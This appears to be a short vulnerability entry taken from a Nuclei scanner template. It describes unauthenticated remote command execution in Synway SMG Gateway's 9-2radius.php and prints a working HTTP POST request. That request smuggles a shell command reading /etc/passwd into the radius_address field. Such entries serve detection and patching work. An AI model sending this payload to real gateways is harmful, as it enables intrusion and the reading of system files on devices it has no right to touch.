# Vulnerability: Synway SMG Gateway 9-2radius.php - Remote Command Execution
**Classification:** RCE
**Source:** Nuclei Template (`synwaysmg-radius-rce.yaml`)

## Description
Synway SMG Gateway Management Software contains a remote command execution vulnerability in 9-2radius.php, where the radius_address parameter is passed to a system() call without sanitization. This allows unauthenticated attackers to execute arbitrary commands on the server.

## Vulnerable Code Pattern / Exploit Payload
```http
POST /en/9-2radius.php?authority=6 HTTP/1.1
Host: {{Hostname}}
Accept-Encoding: gzip
Content-Type: application/x-www-form-urlencoded

save=1&enable_radius=1&radius_address=/';cat /etc/passwd;+#
```

